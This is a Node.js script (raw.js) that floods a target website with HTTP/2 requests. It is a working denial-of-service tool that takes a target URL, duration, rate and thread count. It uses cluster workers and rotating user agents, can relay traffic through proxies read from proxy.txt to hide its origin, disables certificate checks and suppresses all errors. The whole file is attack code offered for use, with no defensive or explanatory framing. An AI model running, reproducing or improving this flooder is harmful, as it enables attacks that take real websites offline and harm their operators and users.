const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);

if (process.argv.length < 5) {
    console.log(`Usage: node raw.js <url> <time> <rate> <threads>`);
    console.log(`Proxy: proxy.txt (format ip:port)`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5]
}

const parsed = url.parse(args.target);
const path = parsed.path;  // Langsung ambil path dari URL, contoh: /bWJoQa78

// Load proxies
let proxies = [];
try {
    proxies = fs.readFileSync("proxy.txt", "utf-8")
        .split(/\r?\n/)
        .filter(line => line.trim() && line.includes(":"))
        .map(line => line.trim());
    console.log(`Loaded ${proxies.length} proxies`);
} catch(e) {
    console.log("No proxy.txt found, using direct connection");
}

// Cipher TLS
const ciphersTLS12 = [
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305"
].join(":");

const ecdhCurve = "x25519:secp256r1:secp384r1";

const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1;

const secureContext = tls.createSecureContext({
    ciphers: ciphersTLS12,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    minVersion: "TLSv1.2",
    maxVersion: "TLSv1.3"
});

// User agents
const uas = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
];

let stats = { total: 0, ok: 0, bad: 0, active: 0 };

if (cluster.isMaster) {
    console.log(`Target: ${args.target}`);
    console.log(`Path: ${path}`);
    console.log(`Time: ${args.time}s | Rate: ${args.rate}/s | Threads: ${args.threads}`);
    console.log(`Proxy mode: ${proxies.length > 0 ? "ON" : "OFF"}`);
    console.log(`====================================`);
    
    for (let i = 0; i < args.threads; i++) cluster.fork();
    
    setInterval(() => {
        console.log(`[${new Date().toLocaleTimeString()}] Total: ${stats.total} | OK: ${stats.ok} | Bad: ${stats.bad} | Active: ${stats.active}`);
    }, 5000);
    
    setTimeout(() => {
        console.log(`\nDone - Total: ${stats.total} | OK: ${stats.ok} | Success: ${((stats.ok/stats.total)*100 || 0).toFixed(2)}%`);
        process.exit();
    }, args.time * 1000);
} else {
    setTimeout(() => {
        setInterval(() => {
            if (stats.active < 2000) flood();
        }, Math.floor(1000 / args.rate));
    }, Math.random() * 1000);
}

function getProxy() {
    if (proxies.length === 0) return null;
    const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(":");
    return { host: proxy[0], port: parseInt(proxy[1]) };
}

function flood() {
    stats.active++;
    
    const proxy = getProxy();
    
    const makeConnection = (socket = null) => {
        const tlsOpts = {
            host: parsed.host,
            port: 443,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: ciphersTLS12,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: true,
            secureContext: secureContext,
            rejectUnauthorized: false,
            servername: parsed.host,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3"
        };
        
        if (socket) tlsOpts.socket = socket;
        
        const sock = tls.connect(tlsOpts, () => {
            const session = http2.connect(`https://${parsed.host}`, {
                createConnection: () => sock
            });
            
            const timer = setInterval(() => {
                const req = session.request({
                    ":method": "GET",
                    ":path": path,  // Langsung pakai path dari URL, contoh: /bWJoQa78
                    ":scheme": "https",
                    ":authority": parsed.host,
                    "user-agent": uas[Math.floor(Math.random() * uas.length)],
                    "accept": "*/*",
                    "cache-control": "no-cache"
                });
                
                req.on("response", (headers) => {
                    stats.total++;
                    if (headers[":status"] === 200) stats.ok++;
                    else stats.bad++;
                    req.destroy();
                });
                
                req.on("error", () => {
                    stats.total++;
                    stats.bad++;
                });
                
                req.end();
            }, Math.floor(1000 / args.rate));
            
            setTimeout(() => {
                clearInterval(timer);
                session.destroy();
                if (socket) socket.destroy();
                if (stats.active > 0) stats.active--;
            }, args.time * 1000);
        });
        
        sock.on("error", () => {
            if (stats.active > 0) stats.active--;
            if (socket) socket.destroy();
        });
        
        return sock;
    };
    
    // Kalo pake proxy
    if (proxy) {
        const proxySock = net.connect({
            host: proxy.host,
            port: proxy.port,
            allowHalfOpen: true
        });
        
        proxySock.setTimeout(10000);
        
        proxySock.on("connect", () => {
            const connectMsg = `CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}\r\n\r\n`;
            proxySock.write(connectMsg);
        });
        
        proxySock.on("data", (data) => {
            const resp = data.toString();
            if (resp.includes("200") || resp.includes("Connection established")) {
                proxySock.removeAllListeners("data");
                makeConnection(proxySock);
            } else {
                proxySock.destroy();
                if (stats.active > 0) stats.active--;
            }
        });
        
        proxySock.on("error", () => {
            if (stats.active > 0) stats.active--;
        });
        
        proxySock.on("timeout", () => {
            proxySock.destroy();
            if (stats.active > 0) stats.active--;
        });
    } else {
        makeConnection(null);
    }
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
